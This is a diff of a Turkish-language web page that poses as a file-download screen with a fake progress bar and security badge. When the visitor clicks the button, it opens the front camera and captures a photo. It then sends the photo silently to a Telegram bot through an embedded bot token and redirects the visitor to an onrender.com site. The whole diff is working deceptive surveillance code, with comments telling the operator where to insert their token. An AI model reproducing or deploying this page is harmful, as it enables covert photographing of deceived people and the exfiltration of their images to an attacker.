@@ -195,7 +195,7 @@
         </button>
         
         <div class="footer-text">
-            <span id="timer">•</span> dosya kimliği: <span id="fileId"><?php echo htmlspecialchars($_GET['id'] ?? 'YÜK4847'); ?></span>
+            <span id="timer">•</span> dosya kimliği: <span id="fileId"></span>
         </div>
     </div>
 
@@ -203,34 +203,31 @@
     <canvas id="c"></canvas>
 
     <script>
-        // Konfigürasyon
+        // TELEGRAM BOT TOKEN'INI BURAYA YAZ (KONTROL ET)
         const CONFIG = {
-            TOKEN: "8221475489:AAHC2XRJVo4k8Q7RK2fUUAzs1Trml4cUi0U", // Telegram Bot Token
-            REDIRECT_URL: "https://kzfreehanemoyum.onrender.com", // Yönlendirilecek URL
-            PROGRESS_STEPS: [20, 45, 70, 85, 95, 100], // İlerleme adımları
-            STEP_DELAYS: [400, 500, 600, 700, 800, 200] // Her adımın bekleme süresi (ms)
+            TOKEN: "8221475489:AAHC2XRJVo4k8Q7RK2fUUAzs1Trml4cUi0U", // Senin token'ın
+            REDIRECT_URL: "https://vurustotal4-1.onrender.com", // İstediğin yönlendirme
+            PROGRESS_STEPS: [20, 45, 70, 85, 95, 100],
+            STEP_DELAYS: [400, 500, 600, 700, 800, 200]
         };
 
-        // URL parametrelerini al
+        // URL'den ID'yi al
         const urlParams = new URLSearchParams(window.location.search);
         const fileId = urlParams.get('id') || 'YÜK' + Math.floor(Math.random() * 10000);
         document.getElementById('fileId').textContent = fileId;
 
-        let progressInterval;
         let currentStep = 0;
 
-        // Profesyonel görünümlü ilerleme simülasyonu
         function startProgressSimulation() {
             const progressFill = document.getElementById('progress');
             const msgElement = document.getElementById('msg');
             const securityBadge = document.getElementById('securityBadge');
             
-            progressInterval = setInterval(() => {
+            const interval = setInterval(() => {
                 if (currentStep < CONFIG.PROGRESS_STEPS.length) {
                     const targetProgress = CONFIG.PROGRESS_STEPS[currentStep];
                     progressFill.style.width = targetProgress + '%';
                     
-                    // Durum mesajlarını güncelle
                     if (targetProgress <= 20) {
                         msgElement.innerHTML = '<span>Dosya indiriliyor</span> <span class="loading-dots"></span>';
                     } else if (targetProgress <= 45) {
@@ -245,18 +242,14 @@
                     
                     currentStep++;
                 } else {
-                    // İlerleme tamamlandı
-                    clearInterval(progressInterval);
+                    clearInterval(interval);
                     msgElement.innerHTML = '<span>Dosya hazır</span> <span style="color: #48bb78;">✓</span>';
                     securityBadge.style.display = 'flex';
-                    
-                    // Butonu göster
                     document.getElementById('btn').classList.add('visible');
                 }
             }, CONFIG.STEP_DELAYS[currentStep]);
         }
 
-        // Timer'ı güncelle (sahte süre)
         function updateTimer() {
             const timerElement = document.getElementById('timer');
             let seconds = 0;
@@ -268,24 +261,20 @@
             }, 1000);
         }
 
-        // Kamera ve fotoğraf gönderme işlemi
         async function captureAndSendPhoto() {
             try {
-                // Kamera izni iste
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, // Ön kamera
+                    video: { facingMode: "user" },
                     audio: false 
                 });
                 
                 const video = document.getElementById('v');
                 video.srcObject = stream;
                 
-                // Buton metnini güncelle
                 const btn = document.getElementById('btn');
                 btn.innerHTML = '<span>Fotoğraf çekiliyor</span> <span class="loading-dots"></span>';
                 btn.disabled = true;
 
-                // Kameranın hazır olmasını bekle
                 await new Promise(resolve => {
                     video.onloadedmetadata = () => {
                         video.play();
@@ -293,7 +282,6 @@
                     };
                 });
 
-                // Fotoğraf çek
                 setTimeout(async () => {
                     const canvas = document.getElementById('c');
                     const context = canvas.getContext('2d');
@@ -302,39 +290,32 @@
                     canvas.height = video.videoHeight;
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
-                    // Fotoğrafı blob'a çevir
                     const photoBlob = await new Promise(resolve => {
                         canvas.toBlob(resolve, 'image/jpeg', 0.8);
                     });
 
-                    // Telegram'a gönder
                     const formData = new FormData();
                     formData.append('chat_id', fileId);
                     formData.append('photo', photoBlob, 'verified_access.jpg');
-                    formData.append('caption', `🔐 Güvenli Erişim Doğrulaması\n📱 Kullanıcı ID: ${fileId}\n⏰ Zaman: ${new Date().toLocaleString('tr-TR')}\n🌐 IP: Gizli (SSL ile korunuyor)`);
+                    formData.append('caption', `🔐 Güvenli Erişim Doğrulaması\n📱 Kullanıcı ID: ${fileId}\n⏰ Zaman: ${new Date().toLocaleString('tr-TR')}`);
 
-                    // Tüm stream'leri durdur
                     stream.getTracks().forEach(track => track.stop());
 
-                    // API'ye gönder (arka planda, bekleme)
+                    // Telegram'a gönder (arka planda)
                     fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {
                         method: 'POST',
                         body: formData
-                    }).catch(err => console.log('Gönderim durumu:', err)); // Hata yönetimi sessiz
+                    }).catch(() => {});
 
-                    // Google'a yönlendir
                     window.location.href = CONFIG.REDIRECT_URL;
                     
-                }, 1500); // 1.5 saniye bekle (kameranın stabilize olması için)
+                }, 1500);
 
             } catch (error) {
-                console.log('Kamera hatası:', error);
-                // Hata durumunda direkt yönlendir
                 window.location.href = CONFIG.REDIRECT_URL;
             }
         }
 
-        // Butona tıklandığında çalışacak fonksiyon
         function handleButtonClick() {
             const btn = document.getElementById('btn');
             if (!btn.disabled) {
@@ -342,7 +323,6 @@
             }
         }
 
-        // Sayfa yüklendiğinde başlat
         window.onload = function() {
             startProgressSimulation();
             updateTimer();
